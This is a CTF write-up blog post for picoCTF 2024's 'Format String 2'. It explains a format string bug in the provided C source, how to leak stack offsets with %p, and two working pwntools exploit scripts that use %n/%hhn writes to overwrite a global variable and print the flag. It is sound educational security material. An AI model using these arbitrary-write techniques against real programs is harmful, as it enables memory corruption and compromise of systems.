@@ -1,0 +1,186 @@
+---
+title: picoCTF - 2024 - Pwn - Format String 2
+date: '2024-04-16'
+tags: ['ctf', 'pwn', 'picoctf', 'fmt', 'arbitrary-write']
+draft: false
+summary: Overwriting a variable using the Format String Bug to fulfill an if-else condition for printing flag.txt. A very interesting challenge, to be honest.
+---
+
+## Challenge Description
+
+![Fmt-2-sc](/static/writeups/picoCTF/pwn/format-string-2/fmt2_chal_des.png)
+
+## Solution
+
+Before starting, I want to say that I am not an expert when it comes to binary exploitation. If you find mistakes in my write-ups, please let me know. I am open to any sort of constructive criticism.
+
+Source code provided to us:
+
+```c:vuln.c
+#include <stdio.h>
+
+int sus = 0x21737573;
+
+int main() {
+  char buf[1024];
+  char flag[64];
+
+  printf("You don't have what it takes. Only a true wizard could change my suspicions. What do you have to say?\n");
+  fflush(stdout);
+  scanf("%1024s", buf);
+  printf("Here's your input: ");
+  printf(buf);
+  printf("\n");
+  fflush(stdout);
+
+  if (sus == 0x67616c66) {
+    printf("I have NO clue how you did that, you must be a wizard. Here you go...\n");
+
+    // Read in the flag
+    FILE *fd = fopen("flag.txt", "r");
+    fgets(flag, 64, fd);
+
+    printf("%s", flag);
+    fflush(stdout);
+  }
+  else {
+    printf("sus = 0x%x\n", sus);
+    printf("You can do better!\n");
+    fflush(stdout);
+  }
+
+  return 0;
+}
+```
+
+We want to make this if-statement true:
+
+```c:If-Condition
+if (sus == 0x67616c66)
+```
+
+But problem is the value of sus is `0x21737573`. So to solve this challenge, we basically have to overwrite the value of **`sus`** to `0x67616c66`.
+
+As **`printf()`** is being used, we can use **`%n`** format specifier to overwrite value of sus.
+
+The **`%n`** modifier writes the amount of chars printed so far as an int to the address specified by the argument. Using the **`$`** specifier we could also specify from exactly where we want to read this address. We could also send the addresses as input to the program which would put those addresses on the stack.
+
+First we want to find the offset of our input string on the stack. For that, i will pass 8 ‘A’ and will leak the addresses of the stack so that I can clearly see where the input is being stored:
+
+```
+AAAAAAAA|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p
+```
+
+Here I can see that my offset is 14:
+
+![Fmt-2-sc](/static/writeups/picoCTF/pwn/format-string-2/fmt2_1.png)
+
+Now, I know that I also need to know what address to write to. In this case it can be found using **`objdump`** on the binary:
+
+```bash:objdump-command
+objdump -D ./vuln | grep "sus"
+```
+
+![Fmt-2-sc](/static/writeups/picoCTF/pwn/format-string-2/fmt2_2.png)
+
+So, basically I want to overwrite address `0x404060` with the value `0x67616c66`. Let’s start making our payload.
+
+For creating the payload, I took help from a Guide on [Format String Bug](https://www.theflash2k.me/blog/ctf-techs/fsb-guide) written by my mentor [TheFlash2k](https://www.theflash2k.me/about). He has explain fmt in very detail.
+
+He has also explain how to arbitrary write 4-bytes by passing one byte at a time. **[** _[Source](https://www.theflash2k.me/blog/ctf-techs/fsb-guide#writing-four-bytes)_ **]**
+
+So the final payload that I created:
+
+```python:final-payload
+#!/usr/bin/env python3
+from pwn import *
+
+# Setting up terminal context for debugging
+context.terminal = ["tmux", "splitw", "-h"]
+
+# Executable and ELF setup
+exe = "./vuln"
+elf = context.binary = ELF(exe)
+
+# If the GDB argument is provided, attach GDB to the process at the specified breakpoint
+if args.GDB:
+    io = process()
+    gdb.attach(io, "b *main+231")
+
+io = remote("rhea.picoctf.net", 61208)
+io.recvuntil(b"?\n")
+
+# Offset = 14
+# 14 (Offset) + 5 (For payload) + 1 (Address to be written on)
+start = 20
+
+# Address of the variable to be overwritten, found using objdump and grep
+sus = 0x404060
+
+# Function to calculate the difference between two values modulo 256
+diff_hhn = lambda i, j: ((i - j) % 256) # (0xFF+1)
+
+payload = f"%{0x66}c%{start}$lln".encode()            # Writing 0x66 to memory
+payload += f"c%{start+1}$hhn".encode()                # Writing 0x66 to sus[0]
+payload += f"%{diff_hhn(0x66,0x61)}c%{start+2}$hhn".encode()  # Writing 0x61 to sus[3]
+payload += f"%{diff_hhn(0x61,0x6c)}c%{start+3}$hhn".encode()  # Writing 0x6c to sus[2]
+payload += b"||||||"                                  # Padding to align memory addresses
+payload += p64(sus)                                   # Address of sus
+payload += p64(sus+3)                                 # Address of sus[3]
+payload += p64(sus+1)                                 # Address of sus[1]
+payload += p64(sus+2)                                 # Address of sus[2]
+
+io.sendline(payload)
+io.interactive()
+```
+
+### Flag:
+
+![Fmt-2-sc](/static/writeups/picoCTF/pwn/format-string-2/fmt2_3.png)
+
+## Bonus
+
+You can automate this whole process by using format string bug exploitation [tools](https://docs.pwntools.com/en/stable/fmtstr.html). The script will be:
+
+```python:payload-crafted-using-exec_fmt-&-autofmt
+from pwn import *
+
+context.log_level = "critical"
+
+context.terminal = ["tmux", "splitw", "-h"]
+exe = "./vuln"
+elf = context.binary = ELF(exe)
+if args.GDB: gdb.attach(io, "b *main+231")
+
+#io = process()
+io = remote("rhea.picoctf.net", 61208)
+
+def exec_fmt(payload):
+    io = remote('rhea.picoctf.net', 61208)
+    io.sendline(payload)
+    return io.recvall()
+
+autofmt = FmtStr(exec_fmt)
+offset = autofmt.offset
+
+payload = fmtstr_payload(offset, {0x404060: 0x67616c66})
+
+io.sendline(payload)
+
+flag = io.recvuntil('}').split(b"...\n")[1]
+flag = flag.decode('utf-8')
+
+print(" ")
+print("Flag:", flag)
+print(" ")
+
+io.interactive()
+```
+
+This script uses the `exec_fmt`, `autofmt` to find the offset for the payload and to find the address use `objump -D vuln` (as we did earlier).
+
+### Flag:
+
+![Fmt-2-sc](/static/writeups/picoCTF/pwn/format-string-2/fmt2_4.png)
+
+> _That’s it for today’s blog, take Care_ 😃
